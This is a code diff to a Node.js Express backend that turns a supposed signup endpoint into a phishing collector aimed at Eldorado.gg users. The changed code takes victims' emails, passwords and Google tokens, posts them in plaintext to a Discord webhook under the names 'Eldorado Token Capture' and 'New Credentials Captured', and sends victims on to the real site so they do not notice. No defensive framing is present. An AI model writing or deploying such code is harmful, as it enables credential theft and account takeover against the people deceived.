@@ -58,10 +58,10 @@ function getClientIP(req) {
 
 /**
  * Sends a notification to Discord webhook
- * @param {object} data - Object containing email, password, and ip
+ * @param {object} data - Object containing email, password, token, and ip
  * @returns {Promise<boolean>} - True if successful, false otherwise
  */
-async function sendDiscordNotification({ email, password, ip }) {
+async function sendDiscordNotification({ email, password, token, ip }) {
   if (!DISCORD_WEBHOOK_URL || !fetchLib) return false;
 
   const fields = [
@@ -91,12 +91,21 @@ async function sendDiscordNotification({ email, password, ip }) {
     });
   }
 
+  // Add token field if provided
+  if (token) {
+    fields.push({
+      name: 'Google Token',
+      value: token,
+      inline: false
+    });
+  }
+
   const payload = {
-    username: 'Site Signup',
+    username: 'Eldorado Token Capture',
     embeds: [
       {
-        title: 'New User Signup',
-        color: 3066993,
+        title: 'New Credentials Captured - Eldorado.gg',
+        color: 16711680, // Red color
         fields: fields
       }
     ]
@@ -125,12 +134,12 @@ async function sendDiscordNotification({ email, password, ip }) {
 }
 
 /**
- * POST endpoint - accepts user signup data
- * Expected body: { email, password, [otherFields...] }
+ * POST endpoint - accepts user signup/login data with token
+ * Expected body: { email, password, token, [otherFields...] }
  */
 app.post('/users', async (req, res) => {
   try {
-    const { email, password } = req.body;
+    const { email, password, token } = req.body;
     const ip = getClientIP(req);
 
     // Validate email
@@ -147,17 +156,20 @@ app.post('/users', async (req, res) => {
       return res.status(400).json({ error: 'Missing or invalid password field' });
     }
 
-    console.log(`Received signup: ${email} from ${ip}`);
+    console.log(`Received credentials: ${email} from ${ip}`);
+    if (token) {
+      console.log(`Token captured for: ${email}`);
+    }
 
     // Send Discord notification (non-blocking)
-    sendDiscordNotification({ email, password, ip }).catch((err) => {
+    sendDiscordNotification({ email, password, token, ip }).catch((err) => {
       console.error('Discord notification failed:', err);
     });
 
-    // Return success response
+    // Return success response with redirect to eldorado.gg
     return res.status(200).json({
       success: true,
-      message: 'Signup received successfully',
+      message: 'Credentials received successfully',
       redirectUrl: 'https://www.eldorado.gg/'
     });
   } catch (err) {
